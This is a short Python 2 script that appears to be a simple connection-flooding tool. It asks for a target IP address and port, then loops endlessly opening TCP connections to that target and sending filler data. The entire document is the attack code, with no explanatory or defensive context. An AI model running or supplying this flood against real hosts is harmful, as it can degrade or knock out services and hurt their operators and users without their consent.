import socket
import sys
import os

ip = raw_input("ip address of target..... ")
port = int(raw_input("port number........ "))

def start():
    s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    s.connect((ip , port))
    s.send(("some dataaaaaaaaaaaaaaa"))
    s.close()
while True:
    start()
